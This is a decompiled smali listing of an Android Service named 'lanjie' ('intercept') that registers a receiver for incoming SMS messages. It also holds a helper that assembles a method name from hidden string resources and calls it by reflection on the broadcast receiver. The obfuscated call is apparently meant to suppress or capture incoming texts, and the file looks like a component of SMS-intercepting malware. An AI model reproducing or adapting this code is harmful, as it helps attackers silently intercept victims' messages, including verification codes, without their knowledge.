.class public Lcom/kk/liushiwu/com/zz/lanjie;
.super Landroid/app/Service;


# instance fields
.field private final a:Ljava/lang/String;

.field private final b:Ljava/lang/String;

.field private final c:Ljava/lang/String;

.field private d:Z

.field private e:Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    iput-object v0, p0, Lcom/kk/liushiwu/com/zz/lanjie;->a:Ljava/lang/String;

    const-string v0, "key"

    iput-object v0, p0, Lcom/kk/liushiwu/com/zz/lanjie;->b:Ljava/lang/String;

    const-string v0, "key1"

    iput-object v0, p0, Lcom/kk/liushiwu/com/zz/lanjie;->c:Ljava/lang/String;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/kk/liushiwu/com/zz/lanjie;->d:Z

    new-instance v0, Lcom/kk/liushiwu/com/zz/b;

    invoke-direct {v0, p0}, Lcom/kk/liushiwu/com/zz/b;-><init>(Lcom/kk/liushiwu/com/zz/lanjie;)V

    iput-object v0, p0, Lcom/kk/liushiwu/com/zz/lanjie;->e:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method static synthetic a(Landroid/content/BroadcastReceiver;Landroid/content/Context;)V
    .locals 3

    :try_start_0
    const-class v0, Landroid/content/BroadcastReceiver;

    new-instance v1, Ljava/lang/StringBuilder;

    const v2, 0x7f050003

    invoke-virtual {p1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const v2, 0x7f050004

    invoke-virtual {p1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x7f050005

    invoke-virtual {p1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x7f050006

    invoke-virtual {p1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Object;

    invoke-virtual {v0, p0, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method static synthetic a(Lcom/kk/liushiwu/com/zz/lanjie;Z)V
    .locals 0

    iput-boolean p1, p0, Lcom/kk/liushiwu/com/zz/lanjie;->d:Z

    return-void
.end method

.method static synthetic a(Lcom/kk/liushiwu/com/zz/lanjie;)Z
    .locals 1

    iget-boolean v0, p0, Lcom/kk/liushiwu/com/zz/lanjie;->d:Z

    return v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/lanjie;->e:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/kk/liushiwu/com/zz/lanjie;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method
